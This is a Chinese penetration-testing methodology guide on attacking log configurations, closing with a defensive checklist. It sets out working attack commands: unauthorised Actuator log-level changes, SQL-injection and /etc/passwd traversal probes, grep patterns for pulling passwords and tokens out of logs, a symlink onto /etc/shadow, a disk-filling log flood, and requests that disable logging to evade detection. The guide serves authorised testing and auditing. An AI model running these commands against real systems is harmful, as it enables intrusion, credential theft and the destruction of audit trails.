# 日志配置攻击 (Log Configuration Attack)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供日志配置攻击的系统化方法论，帮助测试人员发现并利用日志配置错误，评估日志系统配置的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Web 应用日志配置安全测试
- 日志级别配置评估
- 日志存储配置验证
- 日志轮转配置审计

### 1.3 读者对象
- 渗透测试工程师
- 安全配置审计人员
- 系统管理员
- 安全开发人员

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志配置攻击是指攻击者利用目标系统日志配置的错误或缺陷，达到规避检测、窃取信息或破坏日志系统的目的。

**核心原理：**
- **日志级别配置错误**：生产环境使用 DEBUG/TRACE 级别，记录过多敏感信息
- **日志内容配置错误**：记录了敏感数据如密码、令牌、PII 等
- **日志存储配置错误**：日志存储位置、权限、保留策略配置不当
- **日志轮转配置错误**：轮转策略不当导致日志丢失或可被利用

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **开发/测试环境** | 调试接口、测试 API | 日志级别过高，泄露敏感信息 |
| **错误处理** | 异常页面、错误 API 响应 | 堆栈跟踪、SQL 语句泄露 |
| **认证系统** | 登录、注册、密码重置 | 记录明文密码、令牌 |
| **支付系统** | 订单处理、支付回调 | 记录卡号、CVV 等敏感数据 |
| **API 网关** | 请求/响应日志 | 记录完整请求体包含敏感数据 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**日志级别探测：**
```bash
# 触发错误响应，检查是否包含调试信息
GET /api/nonexistent
GET /api/test?id=' OR '1'='1

# 尝试访问调试端点
GET /debug
GET /actuator/loggers
GET /admin/debug-config

# 尝试修改日志级别
POST /actuator/loggers/com.target -d '{"configuredLevel":"DEBUG"}'
```

**日志内容探测：**
```bash
# 发送包含特殊标记的请求，检查响应中是否回显
UNIQUE_MARKER_12345

# 检查错误页面
curl "http://target/api/error"
curl "http://target/../../../etc/passwd"

# 检查敏感数据是否被记录
curl -d "password=TestPass123!" "http://target/login"
# 如果有日志查看接口，检查是否记录了密码
```

**日志存储位置探测：**
```bash
# 常见日志路径探测
GET /logs/application.log
GET /var/log/application.log
GET /api/logs/download?file=application.log

# 路径遍历尝试
GET /static/../../../var/log/application.log
```

#### 2.3.2 白盒测试

**配置文件审计：**
```yaml
# logback-spring.xml 危险配置示例
<configuration>
    <!-- 危险：生产环境使用 DEBUG 级别 -->
    <root level="DEBUG">
        <appender-ref ref="FILE"/>
    </root>
    
    <!-- 危险：记录敏感参数 -->
    <encoder>
        <pattern>%d %p %c - %m%n</pattern>
        <!-- 未过滤敏感字段 -->
    </encoder>
</configuration>
```

```properties
# log4j.properties 危险配置示例
# 危险：日志输出到可公开访问的位置
log4j.appender.File.File=/var/www/html/logs/app.log
# 危险：无权限限制
log4j.appender.File.Append=true
```

**代码审计要点：**
```java
// 危险模式：记录完整请求
logger.debug("Request: {}", request.toString());  // 可能包含敏感数据

// 危险模式：记录密码
logger.info("Login attempt for user: " + username + " with password: " + password);

// 危险模式：记录令牌
logger.debug("JWT Token: " + jwtToken);

// 正确模式：脱敏记录
logger.info("Login attempt for user: {}", sanitize(username));
```

### 2.4 漏洞利用方法

#### 2.4.1 日志级别提升攻击

```bash
# Spring Boot Actuator 未授权访问
# 提升日志级别获取更多信息
curl -X POST http://target/actuator/loggers/com.target.service \
     -H "Content-Type: application/json" \
     -d '{"configuredLevel":"DEBUG"}'

# 然后访问相关接口获取敏感信息
curl http://target/actuator/loggers/com.target.service

# Log4j2 JMX 攻击（如果 JMX 端口暴露）
jconsole target:9999
# 通过 JMX 修改日志级别
```

#### 2.4.2 敏感信息提取

**从日志中提取凭证：**
```bash
# 如果可访问日志文件
grep -i "password\|token\|api_key\|secret" /var/log/application.log

# 提取认证令牌
grep -oP "Bearer \K[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+" /var/log/app.log

# 提取 API 密钥
grep -oP "api[_-]?key[\"']?\s*[:=]\s*[\"']?\K[A-Za-z0-9]+" /var/log/app.log
```

**从错误信息中提取信息：**
```bash
# 触发 SQL 错误获取数据库信息
curl "http://target/api/user?id=1'"
# 响应可能包含：SQLSyntaxErrorException: ... table 'users' ...

# 触发路径遍历错误获取系统信息
curl "http://target/file?name=../../../etc/passwd"
# 错误信息可能泄露：java.io.FileNotFoundException: /var/www/...
```

#### 2.4.3 日志存储攻击

**日志文件覆盖攻击：**
```bash
# 如果日志文件权限配置错误
# 创建符号链接攻击
ln -sf /etc/shadow /var/log/application.log
# 当日志写入时，可能破坏系统文件

# 日志洪水攻击
for i in {1..1000000}; do
    curl "http://target/api/test?param=$i"
done
# 可能填满磁盘空间
```

**日志轮转利用：**
```bash
# 利用日志轮转的时间窗口
# 1. 触发大量日志写入
# 2. 在轮转发生前快速访问旧日志文件
# 3. 此时新日志可能尚未写入，旧日志尚未压缩

# 检查轮转配置
cat /etc/logrotate.d/application

# 利用未压缩的轮转日志
cat /var/log/application.log.1
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过日志过滤规则

```bash
# 如果系统过滤特定关键词
# 使用编码绕过
curl "http://target/search?q=%70%61%73%73%77%6f%72%64"  # password 的 URL 编码

# 使用特殊字符分割
curl "http://target/search?q=pass\x00word"

# 使用 Unicode 变体
curl "http://target/search?q=рassword"  # 使用西里尔字母 а
```

#### 2.5.2 动态配置攻击

```bash
# 如果应用支持动态配置
# 尝试修改日志配置
curl -X PUT "http://target/admin/config" \
     -d '{"logging.level.root":"OFF"}'

# 禁用日志记录
curl -X POST "http://target/api/admin" \
     -d "action=disable_logging"

# 修改日志输出目标
curl -X POST "http://target/api/config" \
     -d '{"logPath":"/tmp/fake.log"}'
```

---

## 第三部分：附录

### 3.1 常见日志配置漏洞清单

| **漏洞类型** | **检测特征** | **风险等级** |
| :--- | :--- | :--- |
| DEBUG 级别 | 响应包含调试信息 | 高 |
| 记录敏感数据 | 日志包含密码/令牌 | 高 |
| 日志路径可访问 | 日志文件可通过 Web 访问 | 高 |
| 无日志脱敏 | 原始数据直接记录 | 中 |
| 日志权限错误 | 日志文件全局可写 | 中 |

### 3.2 安全日志配置检查清单

- [ ] 生产环境使用 INFO 或 WARN 级别
- [ ] 敏感字段在记录前脱敏
- [ ] 日志文件权限设置为 640 或更严格
- [ ] 日志目录与 Web 根目录隔离
- [ ] 配置合理的日志轮转策略
- [ ] 启用日志完整性保护
- [ ] 配置日志访问审计

### 3.3 参考资源

- [OWASP Logging Configuration Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Application_Logging_Cheat_Sheet.html)
- [CWE-532: Information Exposure Through Log Files](https://cwe.mitre.org/data/definitions/532.html)
- [NIST 800-92 Guide to Computer Security Log Management](https://csrc.nist.gov/publications/detail/sp/800-92/final)
